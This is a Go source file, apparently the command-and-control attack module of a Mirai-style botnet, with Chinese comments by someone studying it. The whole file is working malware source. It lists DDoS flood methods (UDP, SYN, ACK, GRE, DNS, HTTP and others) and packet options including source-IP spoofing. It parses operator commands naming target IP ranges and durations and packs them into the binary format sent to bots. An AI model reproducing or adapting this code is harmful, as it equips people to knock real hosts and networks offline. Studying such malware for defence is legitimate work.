package main

import (
    "fmt"
    "strings"
    "strconv"
    "net"
    "encoding/binary"
    "errors"
    "github.com/mattn/go-shellwords"
)

type AttackInfo struct {
    attackID            uint8 //填充attack中的Type
    attackFlags         []uint8  //这种攻击方式可以支持的flags，处理用户输入的flags的时候需要判断
    attackDescription   string   //只在?处理时用于输出提示用户
}

type Attack struct {
    Duration    uint32
    Type        uint8      //atk.Type = atkInfo.attackID
    Targets     map[uint32]uint8    // Prefix/netmask     ip/netmask
    Flags       map[uint8]string    // key=value   len=123     Flags[0] = 123  攻击类型Type和Flags都是传的一个ID
}

type FlagInfo struct {
    flagID          uint8
    flagDescription string  //提示用户时使用
}


//攻击flag  flagID对应的是attack.h里面的攻击选项宏，所以传输的时候只需要传输数字
var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
    "len": FlagInfo {
        0,
        "Size of packet data, default is 512 bytes",
    },
    "rand": FlagInfo {
        1,
        "Randomize packet data content, default is 1 (yes)",
    },
    "tos": FlagInfo {
        2,
        "TOS field value in IP header, default is 0",
    },
    "ident": FlagInfo {
        3,
        "ID field value in IP header, default is random",
    },
    "ttl": FlagInfo {
        4,
        "TTL field in IP header, default is 255",
    },
    "df": FlagInfo {
        5,
        "Set the Dont-Fragment bit in IP header, default is 0 (no)",
    },
    "sport": FlagInfo {
        6,
        "Source port, default is random",
    },
    "dport": FlagInfo {
        7,
        "Destination port, default is random",
    },
    "domain": FlagInfo {
        8,
        "Domain name to attack",
    },
    "dhid": FlagInfo {
        9,
        "Domain name transaction ID, default is random",
    },
    "urg": FlagInfo {
        11,
        "Set the URG bit in IP header, default is 0 (no)",
    },
    "ack": FlagInfo {
        12,
        "Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
    },
    "psh": FlagInfo {
        13,
        "Set the PSH bit in IP header, default is 0 (no)",
    },
    "rst": FlagInfo {
        14,
        "Set the RST bit in IP header, default is 0 (no)",
    },
    "syn": FlagInfo {
        15,
        "Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
    },
    "fin": FlagInfo {
        16,
        "Set the FIN bit in IP header, default is 0 (no)",
    },
    "seqnum": FlagInfo {
        17,
        "Sequence number value in TCP header, default is random",
    },
    "acknum": FlagInfo {
        18,
        "Ack number value in TCP header, default is random",
    },
    "gcip": FlagInfo {
        19,
        "Set internal IP to destination ip, default is 0 (no)",
    },
    "method": FlagInfo {
        20,
        "HTTP method name, default is get",
    },
    "postdata": FlagInfo {
        21,
        "POST data, default is empty/none",
    },
    "path": FlagInfo {
        22,
        "HTTP path, default is /",
    },
    /*"ssl": FlagInfo {
        23,
        "Use HTTPS/SSL"
    },
    */
    "conns": FlagInfo {
        24,
        "Number of connections",
    },
    "source": FlagInfo {
        25,
        "Source IP address, 255.255.255.255 for random",
    },
}


//攻击命令  对应attack.h中定义的宏，攻击方式
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    "udp": AttackInfo {   //根据攻击名称取出AttackInfo
        0,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "UDP flood",
    },
    "vse": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve source engine specific flood",
    },
    "dns": AttackInfo {
        2,
        []uint8 { 2, 3, 4, 5, 6, 7, 8, 9 },
        "DNS resolver flood using the targets domain, input IP is ignored",
    },
    "syn": AttackInfo {
        3,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "SYN flood",
    },
    "ack": AttackInfo {
        4,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ACK flood",
    },
    "stomp": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "TCP stomp flood",
    },
    "greip": AttackInfo {
        6,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE IP flood",
    },
    "greeth": AttackInfo {
        7,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE Ethernet flood",
    },
    "udpplain": AttackInfo {
        9,
        []uint8 {0, 1, 7},
        "UDP flood with less options. optimized for higher PPS",
    },
    "http": AttackInfo {
        10,
        []uint8 {8, 7, 20, 21, 22, 24},
        "HTTP flood",
    },
}


//遍历slice匹配a
func uint8InSlice(a uint8, list []uint8) bool {
    for _, b := range list {    // _忽略序号
        if b == a {
            return true
        }
    }
    return false
}


//构造一个Attack结构体   syn ip/netmask,ip/netmask,ip/netmask 1000  len=111 fin=true
func NewAttack(str string, admin int) (*Attack, error) {
    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}   //就是在填充Attack结构体


    args, _ := shellwords.Parse(str)  //str解析出参数

    var atkInfo AttackInfo
    // Parse attack name    解析命令行参数args[0]  ，即攻击名称
    if len(args) == 0 {
        return nil, errors.New("Must specify an attack name")
    } else {
        if args[0] == "?" {
            validCmdList := "\033[37;1mAvailable attack list\r\n\033[36;1m"
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
            }
            return nil, errors.New(validCmdList)
        }
        var exists bool
        atkInfo, exists = attackInfoLookup[args[0]]   //攻击名称
        if !exists {
            return nil, errors.New(fmt.Sprintf("\033[33;1m%s \033[31mis not a valid attack!", args[0]))
        }
        atk.Type = atkInfo.attackID
        args = args[1:]  //这个好6
    }

    // Parse targets　　　解析命令行参数args[1],即攻击目标
    if len(args) == 0 {
        return nil, errors.New("Must specify prefix/netmask as targets")
    } else {
        if args[0] == "?" {
            return nil, errors.New("\033[37;1mComma delimited list of target prefixes\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
        }

        cidrArgs := strings.Split(args[0], ",")  //攻击目标用,隔开

        if len(cidrArgs) > 255 { //最多255个目标
            return nil, errors.New("Cannot specify more than 255 targets in a single attack!")
        }

        for _,cidr := range cidrArgs {
            prefix := ""
            netmask := uint8(32)
            cidrInfo := strings.Split(cidr, "/")
            if len(cidrInfo) == 0 {
                return nil, errors.New("Blank target specified!")
            }
            prefix = cidrInfo[0]  //ip
            if len(cidrInfo) == 2 {  //有子网掩码
                netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                if err != nil || netmask > 32 || netmask < 0 {
                    return nil, errors.New(fmt.Sprintf("Invalid netmask was supplied, near %s", cidr))
                }
                netmask = uint8(netmaskTmp)
            } else if len(cidrInfo) > 2 {
                return nil, errors.New(fmt.Sprintf("Too many /'s in prefix, near %s", cidr))
            }

            ip := net.ParseIP(prefix)  //parse ip   net里面的函数啊。。。。
            if ip == nil {
                return nil, errors.New(fmt.Sprintf("Failed to parse IP address, near %s", cidr))
            }
            atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
        }
        args = args[1:]
    }

    // Parse attack duration time　　　攻击持续时间
    if len(args) == 0 {
        return nil, errors.New("Must specify an attack duration")
    } else {
        if args[0] == "?" {
            return nil, errors.New("\033[37;1mDuration of the attack, in seconds")
        }
        duration, err := strconv.Atoi(args[0])   //取出攻击持续时间，转换一下  strconv
        if err != nil || duration == 0 || duration > 3600 {
            return nil, errors.New(fmt.Sprintf("Invalid attack duration, near %s. Duration must be between 0 and 3600 seconds", args[0]))
        }
        atk.Duration = uint32(duration)
        args = args[1:]
    }

    // Parse flags　　　
    for len(args) > 0 {

        if args[0] == "?" {
            validFlags := "\033[37;1mList of flags key=val seperated by spaces. Valid flags for this method are\r\n\r\n"
            for _, flagID := range atkInfo.attackFlags {
                for flagName, flagInfo := range flagInfoLookup {
                    if flagID == flagInfo.flagID {
                        validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
                        break
                    }
                }
            }
            validFlags += "\r\nValue of 65535 for a flag denotes random (for ports, etc)\r\n"
            validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
            return nil, errors.New(validFlags)
        }


        flagSplit := strings.SplitN(args[0], "=", 2)
        if len(flagSplit) != 2 {
            return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
        }
        flagInfo, exists := flagInfoLookup[flagSplit[0]]  //flagSplit[0]是len,rand,tos等
        if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
            return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))  //如果有这种攻击不支持的flags，退出
        }
        if flagSplit[1][0] == '"' {   //去掉双引号，主要双引号之间的字符串
            flagSplit[1] = flagSplit[1][1:len(flagSplit[1]) - 1]
            fmt.Println(flagSplit[1])
        }

        if flagSplit[1] == "true" {  //如果有true和false字符串，转为1和0来表示
            flagSplit[1] = "1"
        } else if flagSplit[1] == "false" {
            flagSplit[1] = "0"
        }
        atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]  //填充flags
        args = args[1:]  //每次取出args[0]
    }
    if len(atk.Flags) > 255 {
        return nil, errors.New("Cannot have more than 255 flags")
    }

    return atk, nil
}


//序列化传输attck指令到bot的格式
func (this *Attack) Build() ([]byte, error) {
    buf := make([]byte, 0)   //0个字节，后面再append
    var tmp []byte

    // Add in attack duration  4字节
    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.Duration)
    buf = append(buf, tmp...)

    // Add in attack type  1字节
    buf = append(buf, byte(this.Type))

    // Send number of targets 1字节
    buf = append(buf, byte(len(this.Targets)))

    // Send targets  5n字节
    for prefix,netmask := range this.Targets {
        tmp = make([]byte, 5)
        binary.BigEndian.PutUint32(tmp, prefix)
        tmp[4] = byte(netmask)
        buf = append(buf, tmp...)
    }

    // Send number of flags   1字节
    buf = append(buf, byte(len(this.Flags)))

    // Send flags    key+len+data
    for key,val := range this.Flags {
        tmp = make([]byte, 2)
        tmp[0] = key
        strbuf := []byte(val)
        if len(strbuf) > 255 {
            return nil, errors.New("Flag value cannot be more than 255 bytes!")
        }
        tmp[1] = uint8(len(strbuf))
        tmp = append(tmp, strbuf...)
        buf = append(buf, tmp...)
    }

    // Specify the total length
    if len(buf) > 4096 {
        return nil, errors.New("Max buffer is 4096")
    }
    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))   //为啥最后要把buf的长度发出去？？？
    buf = append(tmp, buf...)

    return buf, nil
}
